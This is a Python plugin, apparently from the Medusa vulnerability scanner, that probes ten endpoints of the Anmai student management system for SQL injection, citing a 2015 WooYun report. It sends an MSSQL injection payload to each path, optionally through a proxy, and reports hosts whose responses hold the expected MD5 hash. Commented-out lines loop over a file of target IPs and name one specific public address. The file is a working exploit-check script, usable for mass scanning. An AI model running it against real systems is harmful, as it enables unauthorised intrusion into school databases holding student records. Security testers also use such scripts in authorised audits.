#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 安脉学生管理系统10处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0108502
author: Lucifer
description: 10处SQL注入。
'''

import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payloads = [
    "/teacher/teachingtechnology/patentinfoEdit.aspx?id=1",
    "/teacher/teachingtechnology/teachingcoursewareEdit.aspx?id=1",
    "/teacher/teachingtechnology/wonderfulcoursewareEdit.aspx?id=1",
    "/teacher/teachingtechnology/ColligationSelect/TeachingExperience_P.aspx?id=1",
    "/teacher/teachingtechnology/ColligationSelect/TeachingPlan_P.aspx?id=1",
    "/teacher/teachingtechnology/ColligationSelect/TeachingPractise_P.aspx?id=1",
    "/teacher/teachingtechnology/ColligationSelect/TeachingReflect_P.aspx?id=1",
    "/teacher/teachingtechnology/ColligationSelect/TeachingSum_up_P.aspx?id=1",
    "/teacher/teachingtechnology/ColligationSelect/wonderfulcourseware_P.aspx?id=1",
    "/teacher/teachingtechnology/Course_Record_P.aspx?id=1"
]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    Medusas=[]
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        for payload in payloads:
            payload_url = scheme + "://" + url + payload+"'+AnD+1=Sys.Fn_varbintohexstr(HashBytes('Md5','1234'))--"
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
                Medusa = "{} 存在安脉学生管理系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas
#if __name__ == '__main__':
    # with open('1.txt', 'r') as f:
    #     for ip in f.readlines():
    #         ip = ip.strip()
    #         audit(assign('WWW', str(ip))[1])
    #medusa('54.37.131.33:8888',"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",'')